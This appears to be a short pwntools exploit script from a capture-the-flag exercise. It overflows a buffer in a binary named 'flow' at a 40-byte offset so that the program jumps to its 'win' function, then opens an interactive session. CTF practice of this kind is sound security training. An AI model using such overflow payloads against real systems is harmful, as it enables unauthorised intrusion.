from pwn import *
from pwn import p64

elf = ELF('flow')
p = elf.process()
# p = remote("0.0.0.0", 2001)
offset = 40
payload = flat({offset: p64(elf.symbols.win)})
p.sendline(payload)
p.interactive()
